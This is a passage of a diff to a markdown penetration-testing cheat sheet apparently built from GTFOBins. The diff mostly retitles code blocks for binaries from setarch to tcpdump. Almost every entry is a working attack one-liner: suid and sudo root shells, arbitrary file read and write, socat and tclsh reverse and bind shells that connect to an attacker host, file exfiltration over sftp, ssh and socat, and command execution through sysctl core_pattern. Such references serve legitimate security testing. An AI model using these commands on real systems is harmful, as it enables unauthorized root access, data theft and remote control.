 setarch -3 /bin/sh
 ```
 <!-- cheat
@@ -8665,7 +8811,9 @@ setarch -3 /bin/sh
 
 #### setarch shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins setarch shell - suid override (suid variant)"
 setarch -3 /bin/sh -p
 ```
 <!-- cheat
@@ -8677,7 +8825,7 @@ setarch -3 /bin/sh -p
 
 This can be used to assign capabilities to executable files.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins setcap privilege-escalation (sudo / suid)"
 setcap cap_setuid+ep $cmd_file
 ```
 <!-- cheat
@@ -8690,7 +8838,7 @@ var cmd_file
 
 This can be run with elevated privileges to change ownership and then read, write, or execute a file.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins setfacl privilege-escalation (sudo / suid)"
 setfacl -m u:$(id -un):rwx $file_in
 ```
 <!-- cheat
@@ -8703,7 +8851,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins setlock shell (sudo / suid / unprivileged)"
 setlock - /bin/sh
 ```
 <!-- cheat
@@ -8711,7 +8859,9 @@ setlock - /bin/sh
 
 #### setlock shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins setlock shell - suid override (suid variant)"
 setlock - /bin/sh -p
 ```
 <!-- cheat
@@ -8723,7 +8873,7 @@ setlock - /bin/sh -p
 
 This still requires a successfull connection to the server.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sftp shell (sudo / suid / unprivileged)"
 sftp user@$lhost
 !/bin/sh
 ```
@@ -8735,7 +8885,7 @@ import tun_ip
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sftp download (sudo / suid / unprivileged)"
 sftp user@$lhost
 get $file_in $file_out
 ```
@@ -8749,7 +8899,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sftp upload (sudo / suid / unprivileged)"
 sftp user@$lhost
 put $file_in $file_out
 ```
@@ -8765,7 +8915,7 @@ var file_out
 
 Commands can be run if the current user's group is specified, therefore no additional permissions are needed.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins sg shell (sudo / unprivileged)"
 sg $(id -ng)
 ```
 <!-- cheat
@@ -8773,7 +8923,9 @@ sg $(id -ng)
 
 #### sg shell - sudo override
 
-```sh title:"sudo variant"
+sudo variant
+
+```sh title:"GTFOBins sg shell - sudo override (sudo variant)"
 sg root
 ```
 <!-- cheat
@@ -8785,7 +8937,7 @@ sg root
 
 This actually deletes the chosen file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins shred file-write (sudo / suid / unprivileged)"
 shred -u $file_out
 ```
 <!-- cheat
@@ -8798,7 +8950,7 @@ var file_out
 
 The read file content is corrupted by randomizing the order of NUL terminated strings.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins shuf file-read (sudo / suid / unprivileged)"
 shuf -z $file_in
 ```
 <!-- cheat
@@ -8809,7 +8961,7 @@ var file_in
 
 The written file content is corrupted by adding a newline.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins shuf file-write (sudo / suid / unprivileged)"
 shuf -e $data -o $file_out
 ```
 <!-- cheat
@@ -8823,7 +8975,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins slsh shell (sudo / suid / unprivileged)"
 slsh -e 'system("/bin/sh")'
 ```
 <!-- cheat
@@ -8835,7 +8987,7 @@ slsh -e 'system("/bin/sh")'
 
 A valid SMB/CIFS server must be available.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins smbclient shell (sudo / unprivileged)"
 smbclient '\\host\share'
 !/bin/sh
 ```
@@ -8846,7 +8998,7 @@ smbclient '\\host\share'
 
 Pull a remote file to disk.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins smbclient download (sudo / unprivileged)"
 smbclient '\\$lhost\share' -c 'get $file_in $file_out'
 ```
 <!-- cheat
@@ -8859,7 +9011,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins smbclient upload (sudo / unprivileged)"
 smbclient '\\$lhost\share' -c 'put $file_in $file_out'
 ```
 <!-- cheat
@@ -8874,7 +9026,7 @@ var file_out
 
 Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` mkdir -p meta/hooks echo -e '#!/bin/sh\n$cmd_file; false' >meta/hooks/install chmod +x meta/hooks/install fpm -n xxxx -s dir -t snap -a all meta ```
 
-```sh title:"sudo"
+```sh title:"GTFOBins snap command (sudo)"
 snap install xxxx_1.0_all.snap --dangerous --devmode
 ```
 <!-- cheat
@@ -8886,7 +9038,7 @@ snap install xxxx_1.0_all.snap --dangerous --devmode
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat shell (sudo / suid / unprivileged)"
 socat - exec:/bin/sh,pty,ctty,raw,echo=0
 ```
 <!-- cheat
@@ -8894,7 +9046,9 @@ socat - exec:/bin/sh,pty,ctty,raw,echo=0
 
 #### socat shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins socat shell - suid override (suid variant)"
 socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
 ```
 <!-- cheat
@@ -8904,7 +9058,7 @@ socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat reverse-shell (sudo / suid / unprivileged)"
 socat tcp-connect:$lhost:$lport exec:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
 <!-- cheat
@@ -8914,7 +9068,9 @@ import lports
 
 #### socat reverse-shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins socat reverse-shell - suid override (suid variant)"
 socat tcp-connect:$lhost:$lport 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
 ```
 <!-- cheat
@@ -8926,7 +9082,7 @@ import lports
 
 Bind a shell to a local port for the attacker to connect to.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat bind-shell (sudo / suid / unprivileged)"
 socat tcp-listen:$lport,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
 ```
 <!-- cheat
@@ -8935,7 +9091,9 @@ import lports
 
 #### socat bind-shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins socat bind-shell - suid override (suid variant)"
 socat tcp-listen:$lport,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
 ```
 <!-- cheat
@@ -8946,7 +9104,7 @@ import lports
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat file-read (sudo / suid / unprivileged)"
 socat -u file:$file_in -
 ```
 <!-- cheat
@@ -8957,7 +9115,7 @@ var file_in
 
 The `echo` command is actually used.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat file-write (sudo / suid / unprivileged)"
 socat -u 'exec:echo $data' open:$file_out,creat
 ```
 <!-- cheat
@@ -8969,7 +9127,7 @@ var file_out
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat download (sudo / suid / unprivileged)"
 socat -u tcp-connect:$lhost:$lport open:$file_out,creat
 ```
 <!-- cheat
@@ -8982,7 +9140,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socat upload (sudo / suid / unprivileged)"
 socat -u file:$file_in tcp-connect:$lhost:$lport
 ```
 <!-- cheat
@@ -8997,7 +9155,7 @@ var file_in
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socket reverse-shell (sudo / suid / unprivileged)"
 socket -qvp '/bin/sh -i' $lhost $lport
 ```
 <!-- cheat
@@ -9009,7 +9167,7 @@ import lports
 
 Bind a shell to a local port for the attacker to connect to.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins socket bind-shell (sudo / suid / unprivileged)"
 socket -svp '/bin/sh -i' $lport
 ```
 <!-- cheat
@@ -9022,7 +9180,7 @@ import lports
 
 The content is actually parsed and corrupted by the command.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins soelim file-read (sudo / suid / unprivileged)"
 soelim $file_in
 ```
 <!-- cheat
@@ -9035,7 +9193,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins softlimit shell (sudo / suid / unprivileged)"
 softlimit /bin/sh
 ```
 <!-- cheat
@@ -9043,7 +9201,9 @@ softlimit /bin/sh
 
 #### softlimit shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins softlimit shell - suid override (suid variant)"
 softlimit /bin/sh -p
 ```
 <!-- cheat
@@ -9055,7 +9215,7 @@ softlimit /bin/sh -p
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sort file-read (sudo / suid / unprivileged)"
 sort -m $file_in
 ```
 <!-- cheat
@@ -9066,7 +9226,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sort file-write (sudo / suid / unprivileged)"
 echo $data | sort -m -o $file_out
 ```
 <!-- cheat
@@ -9080,7 +9240,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins split shell (sudo / suid / unprivileged)"
 split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
 ```
 <!-- cheat
@@ -9090,7 +9250,7 @@ split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
 
 This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins split file-read (sudo / suid / unprivileged)"
 split -b 999 --additional-suffix suffix $file_in prefix
 cat prefixaasuffix
 ```
@@ -9102,7 +9262,7 @@ var file_in
 
 This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins split file-write (sudo / suid / unprivileged)"
 split -b 999 --additional-suffix suffix $file_in prefix
 ```
 <!-- cheat
@@ -9115,7 +9275,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sqlite3 shell (sudo / suid / unprivileged)"
 sqlite3 /dev/null '.shell /bin/sh'
 ```
 <!-- cheat
@@ -9125,7 +9285,7 @@ sqlite3 /dev/null '.shell /bin/sh'
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sqlite3 file-read (sudo / suid / unprivileged)"
 sqlite3 <<EOF
 CREATE TABLE x(x TEXT);
 .import $file_in x
@@ -9140,7 +9300,7 @@ var file_in
 
 Write attacker-controlled data to an arbitrary path.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sqlite3 file-write (sudo / suid / unprivileged)"
 sqlite3 /dev/null -cmd '.output $file_out' 'select "$data";'
 ```
 <!-- cheat
@@ -9154,7 +9314,7 @@ var file_out
 
 This allows to run Python code (`...`).
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins sqlmap inherit (inherits from python) (sudo / unprivileged)"
 sqlmap -u 127.0.0.1 --eval='...'
 ```
 <!-- cheat
@@ -9166,7 +9326,7 @@ sqlmap -u 127.0.0.1 --eval='...'
 
 The file content is actually parsed so only a part of the first line is returned as a part of an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ss file-read (sudo / suid / unprivileged)"
 ss -a -F $file_in
 ```
 <!-- cheat
@@ -9179,7 +9339,7 @@ var file_in
 
 Reconnecting may help bypassing restricted shells.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh shell #1 (sudo / suid / unprivileged)"
 ssh localhost /bin/sh
 ```
 <!-- cheat
@@ -9189,7 +9349,7 @@ ssh localhost /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ssh shell #2 (sudo / unprivileged)"
 ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 ```
 <!-- cheat
@@ -9199,7 +9359,7 @@ ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 
 Spawn the shell on the client, but still requires a successful remote connection.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ssh shell #3 (sudo / unprivileged)"
 ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
 ```
 <!-- cheat
@@ -9209,7 +9369,7 @@ ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
 
 The read file content is corrupted by error prints.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh file-read (sudo / suid / unprivileged)"
 ssh -F $file_in x
 ```
 <!-- cheat
@@ -9220,7 +9380,7 @@ var file_in
 
 Pull a remote file to disk.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh download (sudo / suid / unprivileged)"
 ssh user@$lhost 'cat $file_in"
 ```
 <!-- cheat
@@ -9232,7 +9392,7 @@ var file_in
 
 Push a local file to a remote receiver.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh upload (sudo / suid / unprivileged)"
 echo $data | ssh user@$lhost 'cat >$file_out"
 ```
 <!-- cheat
@@ -9247,7 +9407,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh-agent shell (sudo / suid / unprivileged)"
 ssh-agent /bin/sh
 ```
 <!-- cheat
@@ -9255,7 +9415,9 @@ ssh-agent /bin/sh
 
 #### ssh-agent shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins ssh-agent shell - suid override (suid variant)"
 ssh-agent /bin/sh -p
 ```
 <!-- cheat
@@ -9267,7 +9429,7 @@ ssh-agent /bin/sh -p
 
 The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t $file_out` option can be used.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ssh-copy-id file-read (sudo / unprivileged)"
 ssh-copy-id -f -i $file_in.pub user@$lhost
 ```
 <!-- cheat
@@ -9279,7 +9441,7 @@ var file_in
 
 The input file must have the `.pub` file extension.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins ssh-copy-id file-write (sudo / unprivileged)"
 ssh-copy-id -f -i $file_in.pub -t $file_out user@host
 ```
 <!-- cheat
@@ -9293,7 +9455,7 @@ var file_out
 
 The shared library must contain the `void C_GetFunctionList() {}` function.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh-keygen library-load (sudo / suid / unprivileged)"
 ssh-keygen -D $lib
 ```
 <!-- cheat
@@ -9306,7 +9468,7 @@ var lib
 
 The file content is actually parsed so only a part of each line is returned as a part of an error message.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins ssh-keyscan file-read (sudo / suid / unprivileged)"
 ssh-keyscan -f $file_in
 ```
 <!-- cheat
@@ -9319,7 +9481,7 @@ var file_in
 
 The mount dir must be writable by the invoking user.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins sshfs shell (sudo / unprivileged)"
 echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >$tmp_file
 chmod +x $tmp_file
 sshfs -o ssh_command=$tmp_file x: $dir/
@@ -9333,7 +9495,7 @@ var tmp_file
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins sshfs command (sudo / unprivileged)"
 sshfs -o ssh_command=$cmd_file x: $dir/
 ```
 <!-- cheat
@@ -9345,7 +9507,7 @@ var dir
 
 Pull a remote file to disk.
 
-```sh title:"unprivileged"
+```sh title:"GTFOBins sshfs download (unprivileged)"
 sshfs user@$lhost:/ $dir/
 cp $dir$file_in $file_out
 ```
@@ -9360,7 +9522,7 @@ var file_out
 
 Push a local file to a remote receiver.
 
-```sh title:"unprivileged"
+```sh title:"GTFOBins sshfs upload (unprivileged)"
 sshfs user@$lhost:/ $dir/
 cp $file_in $dir/
 ```
@@ -9376,7 +9538,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sshpass shell (sudo / suid / unprivileged)"
 sshpass /bin/sh
 ```
 <!-- cheat
@@ -9384,7 +9546,9 @@ sshpass /bin/sh
 
 #### sshpass shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins sshpass shell - suid override (suid variant)"
 sshpass /bin/sh -p
 ```
 <!-- cheat
@@ -9396,7 +9560,7 @@ sshpass /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins sshuttle shell (sudo)"
 sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
 ```
 <!-- cheat
@@ -9408,7 +9572,7 @@ sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins start-stop-daemon shell (sudo / suid / unprivileged)"
 start-stop-daemon -S -x /bin/sh
 ```
 <!-- cheat
@@ -9416,7 +9580,9 @@ start-stop-daemon -S -x /bin/sh
 
 #### start-stop-daemon shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins start-stop-daemon shell - suid override (suid variant)"
 start-stop-daemon -S -x /bin/sh -- -p
 ```
 <!-- cheat
@@ -9428,7 +9594,7 @@ start-stop-daemon -S -x /bin/sh -- -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins stdbuf shell (sudo / suid / unprivileged)"
 stdbuf -i0 /bin/sh
 ```
 <!-- cheat
@@ -9436,7 +9602,9 @@ stdbuf -i0 /bin/sh
 
 #### stdbuf shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins stdbuf shell - suid override (suid variant)"
 stdbuf -i0 /bin/sh -p
 ```
 <!-- cheat
@@ -9448,7 +9616,7 @@ stdbuf -i0 /bin/sh -p
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins strace shell (sudo / suid / unprivileged)"
 strace -o /dev/null /bin/sh
 ```
 <!-- cheat
@@ -9456,7 +9624,9 @@ strace -o /dev/null /bin/sh
 
 #### strace shell - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins strace shell - suid override (suid variant)"
 strace -o /dev/null /bin/sh -p
 ```
 <!-- cheat
@@ -9466,7 +9636,7 @@ strace -o /dev/null /bin/sh -p
 
 The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - $data`.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins strace file-write (sudo / unprivileged)"
 strace -s 999 -o $file_out strace - $data
 ```
 <!-- cheat
@@ -9480,7 +9650,7 @@ var file_out
 
 This only returns ASCII strings.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins strings file-read (sudo / suid / unprivileged)"
 strings $file_in
 ```
 <!-- cheat
@@ -9493,7 +9663,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins su shell (sudo)"
 su -c /bin/sh
 ```
 <!-- cheat
@@ -9505,7 +9675,7 @@ su -c /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins sudo shell (sudo)"
 sudo /bin/sh
 ```
 <!-- cheat
@@ -9517,7 +9687,7 @@ sudo /bin/sh
 
 The command is executed by `root` in the background when a core dump occurs.  To trigger a core dump, send the `SIGQUIT` signal to a process, for example:  ``` sleep infinity & kill -QUIT $! ```
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins sysctl command (sudo / suid)"
 sysctl 'kernel.core_pattern=|$cmd_file'
 ```
 <!-- cheat
@@ -9528,7 +9698,7 @@ var cmd_file
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins sysctl file-read (sudo / suid / unprivileged)"
 sysctl -n "/../.$file_in"
 ```
 <!-- cheat
@@ -9541,7 +9711,7 @@ var file_in
 
 It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.
 
-```sh title:"sudo / suid"
+```sh title:"GTFOBins systemctl shell #1 (sudo / suid)"
 echo '[Service]
 Type=oneshot
 ExecStart=$cmd_file
@@ -9559,7 +9729,7 @@ var tmp_file
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins systemctl shell #2 (sudo)"
 echo /bin/sh >$tmp_file
 chmod +x $tmp_file
 SYSTEMD_EDITOR=$tmp_file systemctl edit basic.target
@@ -9572,7 +9742,7 @@ var tmp_file
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins systemctl inherit (inherits from less) (sudo / suid / unprivileged)"
 systemctl
 ```
 <!-- cheat
@@ -9584,7 +9754,7 @@ systemctl
 
 Inherit the capabilities of another binary by invoking it.
 
-```sh title:"sudo"
+```sh title:"GTFOBins systemd-resolve inherit (inherits from less) (sudo)"
 systemd-resolve --status
 ```
 <!-- cheat
@@ -9596,7 +9766,7 @@ systemd-resolve --status
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins systemd-run shell #1 (sudo)"
 systemd-run -S
 ```
 <!-- cheat
@@ -9606,7 +9776,7 @@ systemd-run -S
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo"
+```sh title:"GTFOBins systemd-run shell #2 (sudo)"
 systemd-run -t /bin/sh
 ```
 <!-- cheat
@@ -9616,7 +9786,7 @@ systemd-run -t /bin/sh
 
 Execute an arbitrary non-interactive command.
 
-```sh title:"sudo"
+```sh title:"GTFOBins systemd-run command (sudo)"
 systemd-run $cmd_file
 ```
 <!-- cheat
@@ -9629,7 +9799,7 @@ var cmd_file
 
 Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tac file-read (sudo / suid / unprivileged)"
 tac -s 'RANDOM' $file_in
 ```
 <!-- cheat
@@ -9642,7 +9812,7 @@ var file_in
 
 Read the contents of an arbitrary file.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tail file-read (sudo / suid / unprivileged)"
 tail -c+0 $file_in
 ```
 <!-- cheat
@@ -9655,7 +9825,7 @@ var file_in
 
 The URL is reachable by any host of the same Tailnet.
 
-```sh title:"sudo"
+```sh title:"GTFOBins tailscale upload (sudo)"
 tailscale serve --http=$lport $file_in
 ```
 <!-- cheat
@@ -9669,7 +9839,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar shell #1 (sudo / suid / unprivileged)"
 tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ```
 <!-- cheat
@@ -9679,7 +9849,7 @@ tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar shell #2 (sudo / suid / unprivileged)"
 tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
 ```
 <!-- cheat
@@ -9687,7 +9857,9 @@ tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
 
 #### tar shell #2 - suid override
 
-```sh title:"suid variant"
+suid variant
+
+```sh title:"GTFOBins tar shell #2 - suid override (suid variant)"
 tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
 ```
 <!-- cheat
@@ -9697,7 +9869,7 @@ tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
 
 The archive can also be prepared offline then uploaded to the target.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar shell #3 (sudo / suid / unprivileged)"
 echo '/bin/sh 0<&1' >$tmp_file
 tar cf $tmp_file $tmp_file
 tar xf $tmp_file --to-command /bin/sh
@@ -9710,7 +9882,7 @@ var tmp_file
 
 The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar file-read (sudo / suid / unprivileged)"
 tar cf /dev/stdout $file_in -I 'tar xO'
 ```
 <!-- cheat
@@ -9721,7 +9893,7 @@ var file_in
 
 The archive can also be prepared offline then uploaded to the target.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar file-write (sudo / suid / unprivileged)"
 echo $data >$tmp_file
 tar cf $tmp_file $tmp_file
 tar Pxf $tmp_file --xform s@.*@$file_out@
@@ -9736,7 +9908,7 @@ var tmp_file
 
 The attacker box must have the `rmt` utility installed.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar download (sudo / suid / unprivileged)"
 tar xvf user@$lhost:$file_in.tar --rsh-command=/bin/ssh
 ```
 <!-- cheat
@@ -9748,7 +9920,7 @@ var file_in
 
 The attacker box must have the `rmt` utility installed.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tar upload (sudo / suid / unprivileged)"
 tar cvf user@$lhost:$file_out $file_in --rsh-command=/bin/ssh
 ```
 <!-- cheat
@@ -9763,7 +9935,7 @@ var file_out
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins task shell (sudo / suid / unprivileged)"
 task execute /bin/sh
 ```
 <!-- cheat
@@ -9775,7 +9947,7 @@ task execute /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins taskset shell (sudo / unprivileged)"
 taskset 1 /bin/sh
 ```
 <!-- cheat
@@ -9787,7 +9959,7 @@ taskset 1 /bin/sh
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tasksh shell (sudo / suid / unprivileged)"
 tasksh
 !/bin/sh
 ```
@@ -9800,7 +9972,7 @@ tasksh
 
 The read file content is corrupted by additional text at the beginning.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tbl file-read (sudo / suid / unprivileged)"
 tbl $file_in
 ```
 <!-- cheat
@@ -9813,7 +9985,7 @@ var file_in
 
 Spawn an interactive shell. With sudo/suid this drops you to root.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tclsh shell (sudo / suid / unprivileged)"
 tclsh
 ```
 <!-- cheat
@@ -9823,7 +9995,7 @@ tclsh
 
 Connect back to an attacker-controlled listener.
 
-```sh title:"sudo / suid / unprivileged"
+```sh title:"GTFOBins tclsh reverse-shell (sudo / suid / unprivileged)"
 tclsh
 set s [socket $lhost $lport];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
 ```
@@ -9836,7 +10008,7 @@ import lports
 
 Load an attacker-supplied shared library.
 
-```sh title:"capabilities / sudo / suid / unprivileged"
+```sh title:"GTFOBins tclsh library-load (capabilities / sudo / suid / unprivileged)"
 tclsh
 load $lib x
 ```
@@ -9850,7 +10022,7 @@ var lib
 
 This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins tcpdump command #1 (sudo / unprivileged)"
 echo $cmd_file >$tmp_file
 chmod +x $tmp_file
 tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file
@@ -9862,7 +10034,9 @@ var tmp_file
 
 #### tcpdump command #1 - sudo override
 
-```sh title:"sudo variant"
+sudo variant
+
+```sh title:"GTFOBins tcpdump command #1 - sudo override (sudo variant)"
 echo $cmd_file >$tmp_file
 chmod +x $tmp_file
 tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tmp_file -Z root
@@ -9876,7 +10050,7 @@ var tmp_file
 
 This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.
 
-```sh title:"sudo / unprivileged"
+```sh title:"GTFOBins tcpdump command #2 (sudo / unprivileged)"
